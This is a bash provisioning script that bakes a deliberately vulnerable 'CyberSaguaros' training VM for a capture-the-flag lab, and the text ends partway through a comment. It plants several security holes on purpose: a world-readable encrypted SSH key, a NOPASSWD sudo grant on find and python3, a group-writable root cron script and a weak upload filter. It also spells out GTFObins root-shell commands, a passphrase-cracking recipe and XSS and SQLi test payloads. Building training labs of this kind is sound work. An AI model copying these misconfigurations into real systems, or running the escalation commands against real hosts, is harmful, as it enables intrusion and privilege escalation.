#!/bin/bash
# ============================================================================
# bake-cybersaguaros-template.sh
# ----------------------------------------------------------------------------
# Bakes QEMU VM template 1703: the "CyberSaguaros Research Portal" — a custom
# vulnerable web app on Debian 13 LNMP (nginx + PHP-FPM + MariaDB). Deployed
# as an attachable module via POST /api/admin/lanes/:id/modules.
#
# Attack chain delivered by this template:
#   SSRF (SaguaroBot dataset verifier) -> internal admin-session provisioning
#   -> admin panel -> file-upload webshell (weak extension filter) -> RCE as
#   `saguarobot` (NO sudo) -> read the world-readable, passphrase-protected
#   deploy key in /opt/saguaro/deploy -> crack it (ssh2john + rockyou) -> SSH
#   as `hrivera` -> user flag -> root via sudo NOPASSWD on find / python3
#   (GTFObins), or a fieldops-writable root cronjob -> root flag.
# Off the critical path: reflected XSS + SQLi on /research.php?q=.
#
# App source lives in the CyberCore repo at challenges/cybersaguaros-ssrf/. The
# VM git-clones it from GitHub on first boot (bake time) and the result is
# sealed into the template — lane clones never need repo access. Override the
# repo with CHALLENGE_REPO_URL / CHALLENGE_REPO_REF / CHALLENGE_DIR; set
# CHALLENGE_REPO_TOKEN if the repo is private.
#
# Companion to:
#   - bake-dvwa-template.sh        (sibling attached-module template, 1702)
#   - bake-juice-shop-template.sh  (sibling attached-module template, 1701)
#
# Run on a Proxmox node with internet access. Idempotent: refuses if 1703
# already exists. To re-bake: qm destroy 1703 --purge
# ============================================================================
set -euo pipefail

VMID=${VMID:-1710}
NAME=${NAME:-cybersaguaros-template}
STORAGE=${STORAGE:-vmpool}
SNIPPET_STORAGE="${SNIPPET_STORAGE:-}"
BAKE_BRIDGE="${BAKE_BRIDGE:-vmbr0}"
BAKE_VLAN="${BAKE_VLAN:-20}"
BAKE_DNS="${BAKE_DNS:-100.100.0.1}"
MEMORY=${MEMORY:-2048}
CORES=${CORES:-2}
DISK_GB=${DISK_GB:-12}

CLOUD_IMG_URL="${CLOUD_IMG_URL:-https://cloud.debian.org/images/cloud/trixie/latest/debian-13-generic-amd64.qcow2}"
CLOUD_IMG_LOCAL="/var/lib/vz/template/iso/debian-13-generic-amd64.qcow2"

# App source — git-cloned into the VM at bake time. CHALLENGE_REPO_TOKEN is
# only needed if the repo is private; if set it is spliced into the clone URL.
CHALLENGE_REPO_URL="${CHALLENGE_REPO_URL:-https://github.com/Saguaros-CyberHub/CyberCore.git}"
CHALLENGE_REPO_REF="${CHALLENGE_REPO_REF:-main}"
CHALLENGE_REPO_TOKEN="${CHALLENGE_REPO_TOKEN:-}"

# Repo-relative path to the challenge sources. Renamed in b429b6f
# (challenges/cybersaguaros -> challenges/cybersaguaros-ssrf) while three
# runcmd `cp` lines kept the old path. runcmd has no `set -e`, so all three
# failed silently and the bake only died later at SITE_HTTP with a misleading
# message. Keep the path in ONE place; the APP_SRC marker fails loudly if it
# is ever wrong again.
CHALLENGE_DIR="${CHALLENGE_DIR:-challenges/cybersaguaros-ssrf}"

# Linux accounts on the box.
#   saguarobot — PHP-FPM pool user; the webshell / reverse-shell foothold.
#                NO sudo, NOT in $PRIV_GROUP. It cannot reach root directly —
#                that is the entire point of the group gating below. `sudo -l`
#                is a deliberate dead end.
#   hrivera    — field-station sysadmin. The SSH / user-flag account. Reached
#                ONLY by finding the world-readable deploy private key under
#                $DEPLOY_DIR and cracking its passphrase. Deliberately absent
#                from the portal `users` table so the SQLi cannot leak it, and
#                its Linux password is strong and NOT in rockyou so there is no
#                password-spray shortcut.
#   dvalmont   — red herring. Real SSH login, rockyou password, nothing behind
#                it: no sudo, no group membership, no flag.
#   root       — bake-debug password for instructor inspection.
SAGUAROBOT_PASSWORD="${SAGUAROBOT_PASSWORD:-bake-debug-bot}"
# dvalmont's password is a rockyou word — it is also the SHA-256 hash in the
# portal `users` table (crackable via the SQLi dump). Keep this in sync with
# the dvalmont hash in ${CHALLENGE_DIR}/app/db/seed.sql.
DVALMONT_PASSWORD="sunshine"
ROOT_PASSWORD="${ROOT_PASSWORD:-bake-debug}"

SSH_USER="${SSH_USER:-hrivera}"
# Deliberately NOT crackable. The deploy key is the only intended way in; this
# exists so instructors can console-login or `su - $SSH_USER` during a demo.
SSH_PASSWORD="${SSH_PASSWORD:-Sag-F1eld-Ops-2026!}"

# Passphrase on the planted deploy key — the challenge's one cracking step:
#   ssh2john id_rsa > k.hash && john --wordlist=rockyou.txt k.hash
# MUST be a rockyou.txt word. rockyou is frequency-ordered, so keep it in the
# first ~10k lines or the crack drags on a CPU-only lane Kali.
# VERIFY BEFORE BAKING:  grep -n -x -m1 mariposa /usr/share/wordlists/rockyou.txt
DEPLOY_KEY_PASSPHRASE="${DEPLOY_KEY_PASSPHRASE:-mariposa}"
DEPLOY_DIR="${DEPLOY_DIR:-/opt/saguaro/deploy}"

# $SSH_USER ONLY. Carries the sudo NOPASSWD grant and owns the root cron
# script. saguarobot must NEVER join it, or RCE short-circuits straight past
# the SSH stage to root.
#
# Scoping the privesc through sudoers rather than a setuid bit is both the more
# realistic vector (bad sudoers rules are the single highest-yield finding in a
# real Linux engagement; an admin running `chmod u+s /usr/bin/find` is largely a
# CTF trope) and the cleaner gate: per-user/per-group scoping is exactly what
# sudoers is for, whereas setuid has none and needed an invented 4750 group
# wrapper to keep saguarobot out.
PRIV_GROUP="${PRIV_GROUP:-fieldops}"

# NOTE: flags are deliberately NOT baked into this template.
# src/utils/flag-manager.js plants them at DEPLOY time via plantFlagsForLane(),
# which attached-modules.js calls on every lane attach. That gives each lane its
# own unique 32-hex value, wired into the submission/verification and instructor
# dashboard tables — a baked static flag would be identical on every lane and
# unverifiable. The template only has to provide the right *permissions* for
# those files to land safely; see the /home/$SSH_USER 0750 step in runcmd.
#
# Paths are pinned per-VM in the challenge spec:
#   vms[].flags.user.path = /home/$SSH_USER/user.txt
#   vms[].flags.root.path = /root/root.txt
# The user path override matters — without it plantLinuxUserFlag() writes
# user.txt into EVERY /home/* directory, including saguarobot's, which would
# hand the foothold account the user flag and skip the SSH stage entirely.

# Must match DB_PASS in ${CHALLENGE_DIR}/app/includes/config.php.
DB_APP_PASSWORD="Pr1ckly-Pear-Access-2026"

# ---------- 0. Sanity ----------
if qm status $VMID >/dev/null 2>&1; then
  echo "ERROR: VM $VMID already exists. Destroy first: qm destroy $VMID --purge" >&2
  exit 1
fi
if pct status $VMID >/dev/null 2>&1; then
  echo "ERROR: LXC $VMID exists at the same VMID." >&2
  exit 1
fi

# Effective clone URL — splice in the token for a private repo.
if [ -n "$CHALLENGE_REPO_TOKEN" ]; then
  CLONE_URL="https://${CHALLENGE_REPO_TOKEN}@${CHALLENGE_REPO_URL#https://}"
else
  CLONE_URL="$CHALLENGE_REPO_URL"
fi

pick_snippet_storage() {
  if [ -n "${SNIPPET_STORAGE:-}" ]; then
    if pvesm status -content snippets 2>/dev/null | awk 'NR>1 {print $1}' | grep -qx "$SNIPPET_STORAGE"; then
      echo "$SNIPPET_STORAGE"; return 0
    fi
    echo "ERROR: SNIPPET_STORAGE='$SNIPPET_STORAGE' set but missing 'snippets' content." >&2
    return 1
  fi
  local first
  first=$(pvesm status -content snippets 2>/dev/null | awk 'NR>1 {print $1}' | head -1)
  if [ -n "$first" ]; then echo "$first"; return 0; fi
  local cur
  cur=$(awk '/^[a-z]+: local$/{flag=1} flag && /^\s*content/{print $2; flag=0}' /etc/pve/storage.cfg)
  [ -z "$cur" ] && cur="iso,vztmpl,backup"
  [[ "$cur" != *snippets* ]] && pvesm set local --content "${cur},snippets" >&2
  echo "local"
}

SNIPPET_STORAGE=$(pick_snippet_storage)
echo "==> Snippet storage: $SNIPPET_STORAGE"
echo "==> App source:      git $CHALLENGE_REPO_URL ($CHALLENGE_REPO_REF)"
echo "==> Bake-time NIC:   bridge=$BAKE_BRIDGE${BAKE_VLAN:+ vlan=$BAKE_VLAN}"

# ---------- 1. Download cloud image (cached) ----------
if [ ! -f "$CLOUD_IMG_LOCAL" ]; then
  echo "==> Downloading Debian 13 cloud image (~350MB)..."
  mkdir -p "$(dirname "$CLOUD_IMG_LOCAL")"
  wget --progress=dot:giga -O "${CLOUD_IMG_LOCAL}.tmp" "$CLOUD_IMG_URL"
  mv "${CLOUD_IMG_LOCAL}.tmp" "$CLOUD_IMG_LOCAL"
fi
echo "==> Cloud image: $CLOUD_IMG_LOCAL"

# ---------- 2. Build cloud-init user-data ----------
USERDATA_FILE="cybersaguaros-template-bake-${VMID}.yml"
case "$SNIPPET_STORAGE" in
  local)  USERDATA_PATH="/var/lib/vz/snippets/${USERDATA_FILE}" ;;
  cephfs) USERDATA_PATH="/mnt/pve/cephfs/snippets/${USERDATA_FILE}" ;;
  *)      USERDATA_PATH="/var/lib/vz/snippets/${USERDATA_FILE}" ;;
esac
mkdir -p "$(dirname "$USERDATA_PATH")"

cat > "$USERDATA_PATH" << SNIPPET
#cloud-config
hostname: cybersaguaros
manage_etc_hosts: true

bootcmd:
  - [ sh, -c, 'rm -f /etc/resolv.conf; printf "nameserver $BAKE_DNS\n" > /etc/resolv.conf; exit 0' ]

users:
  - name: saguarobot
    shell: /bin/bash
    lock_passwd: false
    plain_text_passwd: $SAGUAROBOT_PASSWORD
  - name: dvalmont
    shell: /bin/bash
    lock_passwd: false
    plain_text_passwd: $DVALMONT_PASSWORD
  # The SSH / user-flag account. Group membership and everything under its home
  # directory happen in runcmd — $PRIV_GROUP does not exist yet at this point,
  # and write_files runs even earlier, before the account exists at all.
  - name: $SSH_USER
    gecos: H. Rivera, field station systems
    shell: /bin/bash
    lock_passwd: false
    plain_text_passwd: $SSH_PASSWORD

chpasswd:
  list: |
    root:$ROOT_PASSWORD
  expire: false
ssh_pwauth: true
disable_root: false

locale: en_US.UTF-8
timezone: America/Phoenix

package_update: true
package_upgrade: false
packages:
  - qemu-guest-agent
  - openssh-server
  # ssh-keygen / ssh — used to mint the planted deploy key and to run the
  # end-to-end AUTH marker below. A dependency of openssh-server anyway, but
  # the markers depend on it directly, so name it.
  - openssh-client
  - curl
  - wget
  - vim
  - net-tools
  - ca-certificates
  - resolvconf
  - cron
  - git
  - sudo
  - python3
  - nginx
  - mariadb-server
  - php-fpm
  - php-mysql
  - php-curl
  - php-gd
  - php-xml
  - php-mbstring

write_files:
  # ---- LinPE artifact: sudo NOPASSWD find + python3 for $PRIV_GROUP --------
  # The primary privesc. Scoped to the %$PRIV_GROUP group, which holds
  # $SSH_USER and nobody else — saguarobot is not a member, so the webshell
  # foothold sees nothing from "sudo -l" and cannot skip the SSH stage.
  #
  # Because the matching entries are NOPASSWD, sudoers' listpw default of "any"
  # means "sudo -l" prints them WITHOUT prompting for a password. That is the
  # behaviour students expect, and it is why this reads as a discovery moment
  # rather than a password wall.
  #
  # GTFObins escalation, as $SSH_USER (no -p and no setuid(0) needed here --
  # unlike the setuid case, sudo already gives a real uid 0):
  #   sudo find . -exec /bin/sh \; -quit
  #   sudo python3 -c "import os; os.system('/bin/bash')"
  #
  # A syntax error in this file breaks sudo for EVERY user, so the bake runs
  # visudo -c against it and refuses to seal if it does not parse.
  - path: /etc/sudoers.d/fieldops-maint
    permissions: '0440'
    owner: root:root
    content: |
      # Field ops maintenance grant.
      # Lets the on-call sysadmin run the nightly filesystem sweeps and the
      # telemetry reindex without handing out a full root shell.
      #   find    - nightly sweeps (see /opt/saguaro/field-sync.sh)
      #   python3 - telemetry reindex tooling
      %$PRIV_GROUP ALL=(root) NOPASSWD: /usr/bin/find, /usr/bin/python3

  # ---- LinPE artifact: root cron running a $PRIV_GROUP-writable script ------
  # Same shape as bake-dvwa-template.sh's /opt/maintenance.sh, except the write
  # bit is gated to $PRIV_GROUP rather than world-writable, so saguarobot cannot
  # use it to skip the SSH stage. The chown happens in runcmd — the group does
  # not exist yet during write_files.
  #
  # cron requires: no dot in the /etc/cron.d filename, a trailing newline (the
  # YAML block scalar supplies one), and root ownership with no group/world
  # write bit on the crontab file itself.
  - path: /etc/cron.d/saguaro-fieldsync
    permissions: '0644'
    owner: root:root
    content: |
      # Field-station telemetry sync. Runs every minute as root.
      SHELL=/bin/sh
      PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
      * * * * * root /opt/saguaro/field-sync.sh >/dev/null 2>&1

  # World-readable (0775 -> other r-x), and this is how the deploy key is
  # discovered: the "ssh -i" line is the script legitimately doing its job, not
  # a planted hint. Doubles as the privesc target — root runs it every minute
  # and $PRIV_GROUP can edit it.
  #
  # \$SRC / \$DEST are RUNTIME shell variables and must stay escaped; $SSH_USER
  # is a bake-time substitution and must not be.
  - path: /opt/saguaro/field-sync.sh
    permissions: '0755'
    owner: root:root
    content: |
      #!/bin/sh
      # Field-station telemetry sync. Pushes collected telemetry to the
      # off-site store. Field ops edit this file directly (hence the group
      # write bit) -- please keep it idempotent.
      #
      # TODO($SSH_USER): the deploy key under /opt/saguaro/deploy still has the
      # old 2024 passphrase and the wrong mode after the October restore.
      # Rotate it when the new field server is racked.
      SRC=/srv/telemetry
      DEST=fieldstore.cybersaguaros.local:/backups/telemetry
      [ -d "\$SRC" ] || exit 0
      rsync -az --delete \\
        -e "ssh -i /opt/saguaro/deploy/id_rsa -o StrictHostKeyChecking=no" \\
        "\$SRC/" "$SSH_USER@\$DEST/" 2>/dev/null || exit 0

  # ---- Challenge integrity: stop cloud-init re-granting saguarobot full sudo -
  # Lane clones boot on Proxmox's GENERATED cloud-init user-data (the bake only
  # strips cicustom, and attached-modules.js sets nothing but net0 on clone).
  # That generated user-data carries a "users: [default]" list, so cloud-init
  # applies system_info.default_user from /etc/cloud/cloud.cfg — which on Debian
  # is sudo: ["ALL=(ALL) NOPASSWD:ALL"] plus membership of the 'sudo' group.
  # Distro.create_user() early-returns from add_user() because saguarobot already
  # exists, but STILL calls write_sudo_rule(), emitting
  # /etc/sudoers.d/90-cloud-init-users. Net effect: the webshell foothold account
  # gets unrestricted root on every lane, collapsing the whole challenge.
  #
  # system_info is SYSTEM config — user-data cannot override it — so this
  # drop-in wins. 99- sorts last in /etc/cloud/cloud.cfg.d/.
  - path: /etc/cloud/cloud.cfg.d/99-cybercore-default-user.cfg
    permissions: '0644'
    owner: root:root
    content: |
      system_info:
        default_user:
          name: saguarobot
          lock_passwd: false
          sudo: false
          groups: []

  # Backstop for the drop-in. cloud-init's merge semantics for the 'groups'
  # LIST vary by version (append vs replace), so the drop-in alone is not
  # guaranteed to strip 'sudo' group membership. This runs after cloud-final on
  # every boot and removes both grants unconditionally. Deliberately narrow: it
  # touches ONLY cloud-init's own artefacts, nothing else in /etc/sudoers.d.
  - path: /usr/local/sbin/cybercore-sudo-guard.sh
    permissions: '0700'
    owner: root:root
    content: |
      #!/bin/sh
      # Challenge integrity guard — see 99-cybercore-default-user.cfg.
      # saguarobot must hold NO sudo at all: root is reachable only after
      # pivoting to $SSH_USER via the deploy key, then using that account's
      # own NOPASSWD grant or the fieldops-writable root cronjob.
      # This removes ONLY cloud-init's artefacts -- never fieldops-maint.
      rm -f /etc/sudoers.d/90-cloud-init-users
      gpasswd -d saguarobot sudo >/dev/null 2>&1 || true
      exit 0

  - path: /etc/systemd/system/cybercore-sudo-guard.service
    permissions: '0644'
    owner: root:root
    content: |
      [Unit]
      Description=Strip cloud-init's default-user sudo grant (CyberCore challenge integrity)
      After=cloud-final.service
      Wants=cloud-final.service

      [Service]
      Type=oneshot
      RemainAfterExit=yes
      ExecStart=/usr/local/sbin/cybercore-sudo-guard.sh

      [Install]
      WantedBy=multi-user.target

  # ---- Flavour artifact: planted research notes ----------------------------
  # Ambient only. Deliberately does NOT point at the deploy key — students find
  # that by reading field-sync.sh or enumerating /opt, not by being told.
  - path: /opt/saguaro/research-notes.txt
    permissions: '0644'
    content: |
      CyberSaguaros field station — research notes
      --------------------------------------------
      * portal DB app user: saguaro_app / $DB_APP_PASSWORD
      * H. Rivera runs the station box. Ping her before touching anything
        under /opt/saguaro — field ops owns that whole tree.
      * TODO: migrate the backup job to the internal domain. The lab DC is
        dc01.cybersaguaros.local; a Ligolo agent on 10.0.0.0/24 reaches it.

  - path: /etc/cybercore-bake.env
    permissions: '0644'
    content: |
      BAKE_NAME=$NAME
      BAKE_VMID=$VMID
      BAKE_KIND=cybersaguaros

runcmd:
  # ---- Restore bake-time DNS (resolvconf re-symlinks /etc/resolv.conf) ----
  - [ sh, -c, 'rm -f /etc/resolv.conf; printf "nameserver $BAKE_DNS\n" > /etc/resolv.conf' ]

  # ---- Fetch the app from the CyberCore repo (shallow clone) ----
  - [ sh, -c, 'git clone --depth 1 --branch $CHALLENGE_REPO_REF $CLONE_URL /opt/cybersaguaros-src' ]
  # Guard the rename that broke this bake once already (b429b6f). runcmd has no
  # "set -e", so a wrong path would otherwise fail silently three times over and
  # only surface as a confusing SITE_HTTP=no at the very end.
  - [ sh, -c, 'if [ -d /opt/cybersaguaros-src/$CHALLENGE_DIR/app ]; then echo "APP_SRC=yes" >> /etc/cybercore-bake.env; else echo "APP_SRC=no ($CHALLENGE_DIR)" >> /etc/cybercore-bake.env; fi' ]
  - [ sh, -c, 'mkdir -p /var/www/cybersaguaros && cp -r /opt/cybersaguaros-src/$CHALLENGE_DIR/app/. /var/www/cybersaguaros/' ]

  # ---- nginx site ----
  - [ sh, -c, 'cp /opt/cybersaguaros-src/$CHALLENGE_DIR/deploy/nginx-cybersaguaros.conf /etc/nginx/sites-available/cybersaguaros' ]
  - [ sh, -c, 'ln -sf /etc/nginx/sites-available/cybersaguaros /etc/nginx/sites-enabled/cybersaguaros' ]
  - [ sh, -c, 'rm -f /etc/nginx/sites-enabled/default' ]

  # ---- PHP-FPM pool (version-detected) running as saguarobot ----
  - [ sh, -c, 'PHPVER=\$(ls /etc/php/ | head -1); cp /opt/cybersaguaros-src/$CHALLENGE_DIR/deploy/php-fpm-pool.conf /etc/php/\$PHPVER/fpm/pool.d/cybersaguaros.conf' ]

  # ---- MariaDB: database, app user, schema + seed ----
  - [ systemctl, enable, mariadb ]
  - [ systemctl, start, mariadb ]
  - [ sh, -c, 'mysql -e "CREATE DATABASE IF NOT EXISTS cybersaguaros;"' ]
  - [ sh, -c, "mysql -e \"CREATE USER IF NOT EXISTS 'saguaro_app'@'localhost' IDENTIFIED BY '$DB_APP_PASSWORD';\"" ]
  - [ sh, -c, "mysql -e \"GRANT ALL PRIVILEGES ON cybersaguaros.* TO 'saguaro_app'@'localhost';\"" ]
  - [ sh, -c, 'mysql -e "FLUSH PRIVILEGES;"' ]
  - [ sh, -c, 'mysql cybersaguaros < /var/www/cybersaguaros/db/schema.sql' ]
  - [ sh, -c, 'mysql cybersaguaros < /var/www/cybersaguaros/db/seed.sql' ]
  # Drop the SQL files from the deployed app dir once the DB is seeded. They
  # are not needed at runtime, sit outside the nginx webroot anyway, and
  # seed.sql's password hashes otherwise surface as noise in post-exploitation
  # tooling (linpeas file/hash scans).
  - [ sh, -c, 'rm -rf /var/www/cybersaguaros/db' ]

  # ---- Permissions ----
  # App owned by root; only the uploads dir is writable by the PHP-FPM user
  # (so the upload works) — uploads dir doubles as the RCE landing zone.
  - [ sh, -c, 'chown -R root:root /var/www/cybersaguaros' ]
  - [ sh, -c, 'chown -R saguarobot:saguarobot /var/www/cybersaguaros/public/uploads' ]
  - [ sh, -c, 'chmod 755 /var/www/cybersaguaros/public/uploads' ]

  # ==========================================================================
  # Identity + LinPE artifacts. All deliberate.
  # Escaped \$ = runtime guest shell; unescaped = bake-time substitution.
  # (Never write an unescaped dollar-name here unless that variable is really
  # assigned above: the script runs under "set -u", so bash aborts the whole
  # bake with "unbound variable" and blames the heredoc's opening line.
  # Backticks are banned in here too -- this is an UNQUOTED heredoc, so they
  # are command substitution and would execute at bake time.)
  # ==========================================================================

  # ---- Privilege group -----------------------------------------------------
  # $PRIV_GROUP holds $SSH_USER and nobody else. saguarobot must never join it.
  - [ sh, -c, '/usr/sbin/groupadd -f $PRIV_GROUP' ]
  - [ sh, -c, '/usr/sbin/usermod -aG $PRIV_GROUP $SSH_USER' ]

  # ---- Artifact 1: leaked passphrase-protected deploy key ------------------
  # THE lateral-movement path. -m PEM writes the legacy
  # "-----BEGIN RSA PRIVATE KEY-----" form (AES-128-CBC + MD5 KDF), chosen
  # because (a) it is a coherent story for a key predating the October restore
  # and (b) ssh2john/john crack it in seconds, whereas a modern OpenSSH-format
  # ed25519 key uses bcrypt-KDF at 16 rounds and can eat a whole class hour.
  # The private key is left mode 0644 — that is the planted misconfiguration.
  # ~/.ssh keeps NORMAL 0700/0600 perms and sshd StrictModes stays ON, because
  # nothing in this design needs it weakened.
  - [ sh, -c, 'mkdir -p $DEPLOY_DIR' ]
  - [ sh, -c, 'ssh-keygen -q -t rsa -b 2048 -m PEM -C "field-sync@cybersaguaros" -N "$DEPLOY_KEY_PASSPHRASE" -f $DEPLOY_DIR/id_rsa' ]
  - [ sh, -c, 'mkdir -p /home/$SSH_USER/.ssh; cat $DEPLOY_DIR/id_rsa.pub >> /home/$SSH_USER/.ssh/authorized_keys' ]
  - [ sh, -c, 'chown -R $SSH_USER:$SSH_USER /home/$SSH_USER/.ssh; chmod 700 /home/$SSH_USER/.ssh; chmod 600 /home/$SSH_USER/.ssh/authorized_keys' ]
  # *** VULNERABILITY: world-readable SSH private key ***
  - [ sh, -c, 'chown root:root $DEPLOY_DIR/id_rsa $DEPLOY_DIR/id_rsa.pub; chmod 755 $DEPLOY_DIR; chmod 644 $DEPLOY_DIR/id_rsa $DEPLOY_DIR/id_rsa.pub' ]
  # Ambient residue so the directory reads as lived-in rather than planted.
  - [ sh, -c, 'printf "%s\n" "2025-10-14 02:00:04 sync ok  (1.2 GiB, 41 files)" "2025-10-15 02:00:03 sync ok  (0.3 GiB, 12 files)" "2025-10-16 02:00:07 ssh: connect to host fieldstore.cybersaguaros.local port 22: No route to host" > $DEPLOY_DIR/field-sync.log; chmod 644 $DEPLOY_DIR/field-sync.log' ]

  # ---- Artifact 2: sudo NOPASSWD grant ------------------------------------
  # The sudoers file itself is written by write_files above. Nothing to do here
  # beyond the group membership set at the top of this block: the grant targets
  # %$PRIV_GROUP, so joining the group IS the grant. /usr/bin/find and
  # /usr/bin/python3 are left completely untouched at 0755 with no setuid bit —
  # sudoers does all the scoping.

  # ---- Artifact 3: root cron on a $PRIV_GROUP-writable script --------------
  # /opt/saguaro itself stays 0755 root:root, so field-sync.sh can be modified
  # in place but not replaced by rename.
  - [ sh, -c, 'chown root:root /opt/saguaro; chmod 755 /opt/saguaro' ]
  - [ sh, -c, 'chown root:$PRIV_GROUP /opt/saguaro/field-sync.sh; chmod 775 /opt/saguaro/field-sync.sh' ]

  # ---- Artifact 4: home directory permissions (flag containment) -----------
  # No flag files are written here — flag-manager.js plants them at deploy time
  # with a per-lane unique value. What the TEMPLATE must guarantee is that the
  # planted user.txt is unreachable from the webshell.
  #
  # plantLinuxUserFlag() writes the file 0644 and does NOT chown it when an
  # explicit path is given, so the file itself is world-readable. Containment
  # therefore rests entirely on this directory mode: 0750 $SSH_USER:$SSH_USER
  # means saguarobot (other: ---) cannot traverse into /home/$SSH_USER and so
  # cannot read a 0644 file inside it. If this ever regresses to 0755 the SSH
  # stage becomes skippable. The HOME_PERMS marker asserts it.
  - [ sh, -c, 'chmod 750 /home/$SSH_USER' ]

  # ---- Enable + start services ----
  - [ systemctl, enable, qemu-guest-agent ]
  - [ systemctl, enable, ssh ]
  - [ systemctl, enable, cron ]
  - [ systemctl, enable, nginx ]
  # Challenge integrity: enable (do NOT start) the sudo guard, and clear any
  # grant cloud-init already emitted during this bake. "enable" alone is right —
  # the unit's job is to run on every LANE CLONE boot, not during the bake.
  - [ systemctl, daemon-reload ]
  - [ systemctl, enable, cybercore-sudo-guard.service ]
  - [ sh, -c, 'rm -f /etc/sudoers.d/90-cloud-init-users /etc/sudoers.d/saguarobot-python; gpasswd -d saguarobot sudo >/dev/null 2>&1 || true' ]
  - [ sh, -c, 'PHPVER=\$(ls /etc/php/ | head -1); systemctl enable php\${PHPVER}-fpm; systemctl restart php\${PHPVER}-fpm' ]
  - [ systemctl, restart, nginx ]

  # ---- Pre-seal sanity markers. \$ escapes = runtime shell, not bake heredoc ----
  - [ sh, -c, 'sleep 5; ss -ltn "( sport = :80 )" | grep -q LISTEN && echo "PORT_80_LISTEN=yes" >> /etc/cybercore-bake.env || echo "PORT_80_LISTEN=no" >> /etc/cybercore-bake.env' ]
  - [ sh, -c, 'code=\$(curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1/); [ "\$code" = "200" ] && echo "SITE_HTTP=yes" >> /etc/cybercore-bake.env || echo "SITE_HTTP=no (\$code)" >> /etc/cybercore-bake.env' ]
  - [ sh, -c, 'code=\$(curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1/api/verify.php); [ "\$code" = "400" ] && echo "SSRF_ENDPOINT=yes" >> /etc/cybercore-bake.env || echo "SSRF_ENDPOINT=no (\$code)" >> /etc/cybercore-bake.env' ]
  - [ sh, -c, 'curl -s http://127.0.0.1/api/internal/provision.php | grep -q admin_session && echo "INTERNAL_OK=yes" >> /etc/cybercore-bake.env || echo "INTERNAL_OK=no" >> /etc/cybercore-bake.env' ]
  # The upload chain, asserted in four parts. UPLOAD_EXEC and
  # UPLOAD_STATIC_NOEXEC pin the SERVER config: PHP runs from the uploads
  # directory when the name ends in .php, and does NOT run when an image
  # extension comes last. UPLOAD_FILTER_* drive the real code path in
  # admin/storage.php through an admin session, which is the only thing that
  # proves the intake filter still behaves the way the challenge needs.
  - [ sh, -c, 'printf "%s" "<?php echo 92837465;" > /var/www/cybersaguaros/public/uploads/baketest.png.php; out=\$(curl -s http://127.0.0.1/uploads/baketest.png.php); rm -f /var/www/cybersaguaros/public/uploads/baketest.png.php; echo "\$out" | grep -q 92837465 && echo "UPLOAD_EXEC=yes" >> /etc/cybercore-bake.env || echo "UPLOAD_EXEC=no" >> /etc/cybercore-bake.env' ]
  - [ sh, -c, 'printf "%s" "<?php echo 92837465;" > /var/www/cybersaguaros/public/uploads/baketest.php.png; out=\$(curl -s http://127.0.0.1/uploads/baketest.php.png); rm -f /var/www/cybersaguaros/public/uploads/baketest.php.png; echo "\$out" | grep -qF "<?php" && echo "UPLOAD_STATIC_NOEXEC=yes" >> /etc/cybercore-bake.env || echo "UPLOAD_STATIC_NOEXEC=no" >> /etc/cybercore-bake.env' ]
  - [ sh, -c, 'printf "%s" "<?php echo 92837466;" > /tmp/bt1; tok=\$(curl -s http://127.0.0.1/api/internal/provision.php | grep -o "[0-9a-f]\{48\}" | head -1); curl -s -b "admin_session=\$tok" -F "file=@/tmp/bt1;filename=baketest2.png.php" http://127.0.0.1/admin/storage.php > /dev/null; out=\$(curl -s http://127.0.0.1/uploads/baketest2.png.php); rm -f /tmp/bt1 /var/www/cybersaguaros/public/uploads/baketest2.png.php; echo "\$out" | grep -q 92837466 && echo "UPLOAD_FILTER_BYPASS=yes" >> /etc/cybercore-bake.env || echo "UPLOAD_FILTER_BYPASS=no" >> /etc/cybercore-bake.env' ]
  - [ sh, -c, 'printf "%s" "<?php echo 92837467;" > /tmp/bt2; tok=\$(curl -s http://127.0.0.1/api/internal/provision.php | grep -o "[0-9a-f]\{48\}" | head -1); out=\$(curl -s -b "admin_session=\$tok" -F "file=@/tmp/bt2;filename=baketest3.php" http://127.0.0.1/admin/storage.php); rm -f /tmp/bt2 /var/www/cybersaguaros/public/uploads/baketest3.php; echo "\$out" | grep -q "Only image files" && echo "UPLOAD_FILTER_BLOCKS_NAIVE=yes" >> /etc/cybercore-bake.env || echo "UPLOAD_FILTER_BLOCKS_NAIVE=no" >> /etc/cybercore-bake.env' ]
  # Reflected XSS: prove the payload comes back RAW. grep -F is essential — the
  # payload is not a regex. If research.php still escaped the term, the body
  # would carry &lt;script&gt; and this fails.
  - [ sh, -c, 'body=\$(curl -s -G --data-urlencode "q=<script>alert(92837465)</script>" http://127.0.0.1/research.php); printf "%s" "\$body" | grep -Fq "<script>alert(92837465)</script>" && echo "XSS_REFLECT=yes" >> /etc/cybercore-bake.env || echo "XSS_REFLECT=no" >> /etc/cybercore-bake.env' ]

  # SQLi must NOT have regressed while editing research.php: %27 breaks the
  # LIKE string and PDO's message renders in <pre class="dberr">.
  - [ sh, -c, 'curl -s "http://127.0.0.1/research.php?q=x%27" | grep -q "SQLSTATE" && echo "SQLI_ENDPOINT=yes" >> /etc/cybercore-bake.env || echo "SQLI_ENDPOINT=no" >> /etc/cybercore-bake.env' ]

  # Deploy key: present, actually ENCRYPTED, and readable by saguarobot.
  - [ sh, -c, 'if grep -q "ENCRYPTED" $DEPLOY_DIR/id_rsa 2>/dev/null && su -s /bin/sh saguarobot -c "cat $DEPLOY_DIR/id_rsa" >/dev/null 2>&1; then echo "DEPLOY_KEY=yes" >> /etc/cybercore-bake.env; else echo "DEPLOY_KEY=no" >> /etc/cybercore-bake.env; fi' ]

  # NEGATIVE: the key must NOT authenticate without the passphrase. If this ever
  # passes, the passphrase silently did not take and the cracking stage is
  # skippable. NOTE the chmod 600 on the COPY: the shipped key is deliberately
  # 0644, and ssh refuses a world-readable key outright ("UNPROTECTED PRIVATE
  # KEY FILE") — testing it in place would pass for the wrong reason and prove
  # nothing about the passphrase. BatchMode=yes means ssh cannot prompt, so an
  # encrypted key fails and an unencrypted one succeeds.
